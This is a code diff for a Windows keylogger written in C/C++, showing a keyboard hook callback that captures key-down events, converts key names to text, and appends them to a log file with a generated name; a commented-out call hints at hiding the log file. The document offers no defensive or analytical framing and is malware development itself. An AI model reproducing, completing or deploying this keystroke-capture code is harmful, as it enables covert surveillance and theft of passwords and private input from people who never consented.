@@ -31,18 +31,14 @@ DWORD WINAPI Keylogger(LPVOID lpParm)
 
 LRESULT WINAPI Hook(int nCode, WPARAM wParam, LPARAM lParam)
 {
-	const char* workFullPath;
-	const char* temp;
+	char* workFullPath;
 
 
 	if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN)))
 	{
-		workFullPath = getlogfilepath("\\asdf.txt");
+		workFullPath = getlogfilepath(getlogfilename());
 		if (workFullPath)
 		{
- 			// printf("%s", getlogfilename);
-			// workFullPath = getlogfilepath("\\asdf.txt"); // dupcat(currentDirectory, "\\work.txt", NULL);
-			// sprintf(workFullPath, "%s", getlogfilepath(getlogfilename()));
 			f = fopen(workFullPath, "a+");
 			//DWORD aa = GetLastError();
 		}
@@ -50,10 +46,10 @@ LRESULT WINAPI Hook(int nCode, WPARAM wParam, LPARAM lParam)
 		DWORD dwMsg = 1;
 		dwMsg += hooked_key.scanCode << 16;
 		dwMsg += hooked_key.flags << 24;
-		char lpszKeyName[1024] = { 0 };
+		wchar_t lpszKeyName[1024] = { 0 };
 		lpszKeyName[0] = '[';
 
-		int i = GetKeyNameText(dwMsg, LPWSTR(lpszKeyName + 1), 0xFF) + 1;
+		int i = GetKeyNameText(dwMsg, (lpszKeyName + 1), 0xFF) + 1;
 		int key = hooked_key.vkCode;
 		lpszKeyName[i] = ']';
 		if (key >= 'A' && key <= 'Z')
@@ -66,7 +62,7 @@ LRESULT WINAPI Hook(int nCode, WPARAM wParam, LPARAM lParam)
 		else
 		{
 			if (f != NULL)
-				fprintf(f, "%s", lpszKeyName);
+				fprintf(f, "%s", ConvertWCtoC(lpszKeyName));
 		}
 		keysPressed++;
 		//hide_file(workFullPath);
